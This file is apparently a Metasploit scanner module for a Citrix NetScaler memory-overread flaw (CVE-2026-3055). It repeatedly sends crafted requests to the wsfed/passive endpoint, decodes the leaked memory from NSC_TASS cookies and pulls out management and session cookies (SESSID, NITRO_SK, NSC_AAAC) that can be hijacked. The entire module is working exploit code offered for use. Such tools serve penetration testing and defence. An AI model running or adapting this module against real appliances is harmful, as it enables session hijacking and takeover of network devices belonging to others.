##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Citrix ADC (NetScaler) CVE-2026-3055 Scanner',
        'Description' => %q{
          This module scans for a vulnerability that allows a remote, unauthenticated attacker to leak memory from a
          target Citrix ADC server configured as a SAML IdP. The leaked memory is then scanned for session cookies
          which can be hijacked if found.
        },
        'Author' => [
          'watchTowr', # Original technical analysis and PoC for CVE-2026-3055
          'sfewer-r7' # Metasploit module for CVE-2026-3055, based on the watchTowr PoC and Spencer McIntyre's module for CVE-2023-4966.
        ],
        'References' => [
          ['CVE', '2026-3055'],
          ['URL', 'https://labs.watchtowr.com/the-sequels-are-never-as-good-but-were-still-in-pain-citrix-netscaler-cve-2026-3055-memory-overread/'],
          ['URL', 'https://labs.watchtowr.com/please-we-beg-just-one-weekend-free-of-appliances-citrix-netscaler-cve-2026-3055-memory-overread-part-2/']
        ],
        'DisclosureDate' => '2026-03-23',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'DefaultOptions' => { 'RPORT' => 443, 'SSL' => true }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path', '/']),
        OptInt.new('LEAK_REQUEST_COUNT', [true, 'The number of HTTP requests per host to try and leak data', 4096]),
      ]
    )
  end

  def check_host(_target_host)
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'wsfed', 'passive'),
      'headers' => {
        'Host' => Rex::Text.rand_text_alpha(128)
      },
      'vars_get' => {
        'wctx' => nil
      }
    )
    return Exploit::CheckCode::Unknown('Connection failed') unless res

    return Exploit::CheckCode::Unknown("Unexpected response code #{res.code}") unless res.code == 302

    cookies = res.get_cookies

    return Exploit::CheckCode::Safe('Response has no cookies') if cookies.empty?

    return Exploit::CheckCode::Safe('Response has no NSC_TASS cookie') unless cookies.include? 'NSC_TASS='

    Exploit::CheckCode::Appears('Response contains an NSC_TASS cookie.')
  end

  def run_host(_target_host)
    # We track the number of bytes we leak to report back to teh user and help determine if we triggered the vuln or not.
    leaked_data_count = 0

    # We use a set to track the unique leaked cookies, so we dont report leaking the same cookie numerous times.
    found_cookies = Set.new

    # As we cannot control what we leak, we hit the vuln up to LEAK_REQUEST_COUNT times and hope that we leak
    # something useful during one of those attempts.
    datastore['LEAK_REQUEST_COUNT'].times do
      # Trigger CVE-2026-3055...
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'wsfed', 'passive'),
        'headers' => {
          'Host' => Rex::Text.rand_text_alpha(128)
        },
        'vars_get' => {
          'wctx' => nil
        }
      )

      # Bail out early if the connection fails for this host
      unless res
        vprint_error("#{peer} - Connection failed")
        break
      end

      # A vulnerable host will return 302, but may occasionally return a 200 error, we test for this and keep
      # going if we see teh 200 error, otherwise we bail out early.
      unless res.code == 302
        vprint_error("#{peer} - Unexpected response code #{res.code}")

        # If has been observed that some request generate a 200 response for a SAML error. We can continue
        # trying to leak data rather than bail out early.
        next if res.code == 200 && res.body == 'Undefined SAML error'

        break
      end

      # The leaked data comes back to us in a Set-Cookie header, so we bail out early if no cookies are returned.
      # This will handle a patched appliance.
      cookies = res.get_cookies
      if cookies.empty?
        vprint_error("#{peer} - Response has no cookies")
        break
      end

      # For every cookie returned, iterate over its key value pair and look for the NSC_TASS cookies which will
      # contain the leaked memory (base64 encoded)
      key_vals = cookies.scan(/\s?([^, ;]+?)=([^, ;]*?)[;,]/)

      key_vals.each do |k, v|
        next unless k == 'NSC_TASS'

        bytes = Rex::Text.decode_base64(v)

        # A patched system will not return a base64 encoded NSC_TASS value, so if we can decode it, it's a strong
        # indicator of a vulnerable system. Even if the memory we leak doesn't contain session cookies.
        leaked_data_count += bytes.bytesize

        # Detect the SESSID and optional NITRO_SK cookie pair. The SESSID value is a hex string, while the NITRO_SK
        # value is URL-encoded base64. The two cookies may appear in either order in the leaked data. These cookies
        # are from the management interface. Note, the management interface may or may not be bound to the same RHOST IP
        # address we are targeting, that depends on the appliance configuration. We can still leak it as its all in
        # memory either way, but we may not be able to reuse it if we cant access the management interface.
        bytes.scan(/SESSID=([0-9a-f]{32})/i).each do |match|
          sessid_value = match.first

          next if found_cookies.include?("SESSID=#{sessid_value}")

          found_cookies.add("SESSID=#{sessid_value}")

          nitro_sk_match = bytes.match(/NITRO_SK=([^\s;,]+)/i)

          if nitro_sk_match
            nitro_sk_value = nitro_sk_match[1]

            print_good("#{peer} - Leaked cookie pair: SESSID=#{sessid_value}; NITRO_SK=#{nitro_sk_value}")
          else
            print_good("#{peer} - Leaked cookie: SESSID=#{sessid_value}")
          end
        end

        # Detect NSC_AAAC cookies independently of the SESSID/NITRO_SK pair.
        bytes.scan(/NSC_AAAC=([0-9a-f]{32,64})/i).each do |match|
          nsc_aaac_value = match.first

          next if found_cookies.include?("NSC_AAAC=#{nsc_aaac_value}")

          found_cookies.add("NSC_AAAC=#{nsc_aaac_value}")

          print_good("#{peer} - Leaked cookie: NSC_AAAC=#{nsc_aaac_value}")
        end
      end
    rescue Errno::ECONNRESET
      # It was observed that the server may reset the connection when activity on the management interface is occurring.
      vprint_warning("#{peer} - Connection reset")
    end

    if leaked_data_count > 0
      message = "The target is vulnerable. Leaked #{leaked_data_count} bytes"
      if found_cookies.empty?
        message += ', but did not leak any session cookies.'
      else
        message += ", and #{found_cookies.size} unique session cookies pairs."
      end

      print_status("#{peer} - #{message}")

      report_vuln
    else
      print_status("#{peer} - The target does not appear vulnerable.")
    end
  end

  def report_vuln
    super(
      host: rhost,
      port: rport,
      name: name,
      refs: references
    )
  end
end
